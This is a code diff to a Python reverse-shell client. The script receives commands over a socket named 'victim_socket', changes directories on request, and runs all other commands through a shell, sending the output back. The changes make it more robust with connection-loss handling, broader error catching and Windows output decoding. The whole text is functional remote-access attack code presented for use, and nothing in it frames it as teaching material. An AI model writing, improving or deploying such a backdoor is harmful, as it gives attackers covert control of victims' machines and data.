@@ -15,7 +15,13 @@ while True:
         time.sleep(5)
 
 while True:
-    command = victim_socket.recv(1024).decode('utf-8')
+    try:
+        command = victim_socket.recv(1024).decode('utf-8')
+    
+    except Exception as e:
+        print(f"Connection lost: {e}")
+        break
+
 
     if command == "":
         continue
@@ -25,29 +31,43 @@ while True:
         break
 
     if command.startswith("cd"):
-        pathToMove = command[3:].strip()
+        path_to_move = command[3:].strip()
         
-        if not pathToMove:
+        if not path_to_move:
             current_dir = os.getcwd()
             victim_socket.send(f"Current directory: {current_dir}".encode())
             continue
        
         try:
-            os.chdir(pathToMove)
+            os.chdir(path_to_move)
             print(f"{command} is executed successfully!")
             victim_socket.send(f"Changed directory to {os.getcwd()}".encode())
-        except FileNotFoundError:
-            victim_socket.send(f"Directory not found: {pathToMove}".encode())
+
+        except (FileNotFoundError, PermissionError, OSError) as e:
+            victim_socket.send(f"Failed to change directory: {str(e)}".encode())
+
         continue
 
     try:
-        command_output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+        encoding = "utf-8"
+        if(os.name == "nt"):
+            encoding = "cp437"
         
-        if(command_output.strip().decode() == ""):
+        command_output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+        decoded_output = command_output.decode(encoding, errors="replace").strip()
+        
+        if(decoded_output == ""):
             command_output = f"{command} executed successfully (no output)!".encode()
+        else:
+            command_output = decoded_output.encode("utf-8")
 
     except subprocess.CalledProcessError as e:
-        command_output = f"Command failed:\n{e.output.decode()}".encode()
+        if e.output:
+            error_output = e.output.decode(encoding, errors="replace")
+        else:
+            error_output = str(e)
+        command_output = f"Command failed:\n{error_output}".encode()
+
     except Exception as e:
         command_output = f"Error: {str(e)}".encode()
 
